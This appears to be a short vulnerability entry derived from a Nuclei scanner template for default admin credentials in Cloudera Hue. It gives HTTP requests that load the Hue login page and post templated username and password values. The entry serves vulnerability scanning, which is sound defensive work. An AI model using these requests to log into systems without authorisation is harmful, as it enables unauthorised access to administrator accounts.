# Vulnerability: Cloudera Hue Default Admin Login
**Classification:** CWE-522
**Source:** Nuclei Template (`hue-default-credential.yaml`)

## Description
Cloudera Hue default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /hue/accounts/login?next=/ HTTP/1.1
Host: {{Hostname}}

POST /hue/accounts/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

csrfmiddlewaretoken={{csrfmiddlewaretoken}}&username={{user}}&password={{pass}}&next=%2F
```

